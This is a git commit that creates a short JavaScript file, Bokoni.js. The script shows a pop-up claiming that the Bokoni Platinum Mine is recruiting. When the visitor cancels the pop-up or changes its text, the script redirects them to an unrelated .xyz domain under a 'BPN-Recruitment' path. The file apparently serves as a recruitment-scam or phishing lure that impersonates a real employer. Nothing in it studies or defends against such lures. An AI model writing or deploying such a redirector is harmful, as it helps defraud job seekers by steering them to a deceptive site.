cc9dd6f1c540dcb54948837d08f27763d3ea80f5
newetijazz3 <newetijazz3@gmail.com>
2025-08-18 17:23:09 +0100

    Create Bokoni.js

---
+++ Bokoni.js
@@ -0,0 +1,6 @@
+
+var password = 'Bokoni Platinum Mines Recruitment'
+password=prompt('NOTICE: The Bokoni Platinum Mine is currently recruiting in various positions, press OK to apply for the','Bokoni Platinum Mines Recruitment');
+if (password != 'Bokoni Platinum Mines Recruitment') {
+location.href='https://www.ikimette.xyz/BPN-Recruitment';
+}
